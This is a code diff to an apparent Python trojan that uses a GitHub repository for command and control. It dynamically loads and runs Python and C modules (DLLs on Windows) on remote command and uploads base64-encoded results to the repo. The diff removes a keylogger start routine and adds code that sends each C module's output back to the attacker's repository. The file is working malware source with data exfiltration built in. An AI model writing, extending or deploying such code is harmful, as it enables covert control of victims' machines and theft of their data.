@@ -11,6 +11,7 @@ import requests
 import ctypes
 from datetime import datetime
 from pynput import keyboard  # Added for keylogger
+import os  # Needed to check and load C modules
 
 # Define a function to connect to GitHub
 def github_connect():
@@ -118,8 +119,6 @@ class Trojan:
                         importlib.import_module(module_name)
                     thread = threading.Thread(target=self.module_runner, args=(module_name,))
                     thread.start()
-            elif command_type == 'keylogger':
-                self.start_keylogger()
             elif command_type == 'c_module':
                 module_name = command.get('module')
                 if module_name:
@@ -137,12 +136,6 @@ class Trojan:
         bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
         self.repo.create_file(remote_path, message, bindata)
 
-    def start_keylogger(self):
-        keylogger = Keylogger()
-        keylogger_thread = threading.Thread(target=keylogger.run)
-        keylogger_thread.start()
-        print("[*] Keylogger started.")
-
     def load_c_module(self, module_name):
         if os.name == 'nt':  # Windows
             return ctypes.CDLL(f"{module_name}.dll")
@@ -156,7 +149,9 @@ class Trojan:
             run_func = c_module.run
             run_func.restype = ctypes.c_char_p
             result = run_func()
-            print(result.decode())
+            result = result.decode('utf-8')
+            print(result)
+            self.send_command_result(module_name, result)
         except Exception as e:
             print(f"Error running C module {module_name}: {e}")
 
